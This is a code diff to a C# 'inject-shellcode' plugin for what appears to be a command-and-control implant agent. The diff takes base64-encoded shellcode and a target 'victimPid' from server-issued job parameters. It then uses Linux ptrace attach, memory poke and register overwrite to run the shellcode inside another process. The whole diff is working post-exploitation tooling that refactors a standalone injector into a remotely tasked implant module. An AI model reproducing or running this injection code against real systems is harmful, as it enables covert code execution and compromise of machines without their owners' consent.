@@ -2,6 +2,9 @@
 using Agent.Models;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using Agent.Utilities;
+using Microsoft.Win32.SafeHandles;
+using System.Text.Json;
 
 namespace Agent
 {
@@ -10,37 +13,48 @@ namespace Agent
         public string Name => "inject-shellcode";
         private IMessageManager messageManager { get; set; }
         private ITokenManager tokenManager { get; set; }
+        private ISpawner spawner { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
+            this.spawner = spawner;
         }
 
         public async Task Execute(ServerJob job)
         {
-            //if (args.Length < 1)
-            //{
-            //    Console.WriteLine("Usage:\n\t./inject PID\n\n\tPID - PID of the process to inject code.");
-            //    Environment.Exit(1);
-            //}
+            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);
 
-            
+            if (!args.Validate(out var message))
+            {
+                await messageManager.AddResponse(new ResponseResult()
+                {
+                    task_id = job.task.id,
+                    user_output = message,
+                    completed = true,
+                    status = "error"
+                });
+                return;
+            }
+
+            //Create new process
+            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
 
             int pidMax = GetProcPidMax();
-            long victimPid = Convert.ToInt64(args[0]);
-
+            //long victimPid = Convert.ToInt64(args[0]);
+            long victimPid = (long)args.pid;
             if (victimPid == 0 || victimPid > pidMax)
             {
                 Console.WriteLine("Argument not a valid number. Aborting.");
-                Environment.Exit(1);
+                return;
             }
 
             // Attach to the victim process.
             if (PTrace.PtraceAttach(victimPid) < 0)
             {
                 Console.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}");
-                Environment.Exit(1);
+                return;
             }
             PTrace.Wait(null);
 
@@ -51,7 +65,7 @@ namespace Agent
             if (PTrace.PtraceGetRegs(victimPid, out oldRegs) < 0)
             {
                 Console.WriteLine($"Failed to PTRACE_GETREGS: {Marshal.GetLastWin32Error()}");
-                Environment.Exit(1);
+                return;
             }
 
             long address = ParseMapsFile(victimPid);
@@ -67,7 +81,7 @@ namespace Agent
                 if (PTrace.PtracePokeText(victimPid, address + i, value) < 0)
                 {
                     Console.WriteLine($"Failed to PTRACE_POKETEXT: {Marshal.GetLastWin32Error()}");
-                    Environment.Exit(1);
+                    return;
                 }
             }
 
@@ -78,13 +92,13 @@ namespace Agent
             if (PTrace.PtraceSetRegs(victimPid, regs) < 0)
             {
                 Console.WriteLine($"Failed to PTRACE_SETREGS: {Marshal.GetLastWin32Error()}");
-                Environment.Exit(1);
+                return;
             }
 
             if (PTrace.PtraceCont(victimPid, IntPtr.Zero) < 0)
             {
                 Console.WriteLine($"Failed to PTRACE_CONT: {Marshal.GetLastWin32Error()}");
-                Environment.Exit(1);
+                return;
             }
 
             Console.WriteLine("[*] Successfully injected and jumped to the code.");
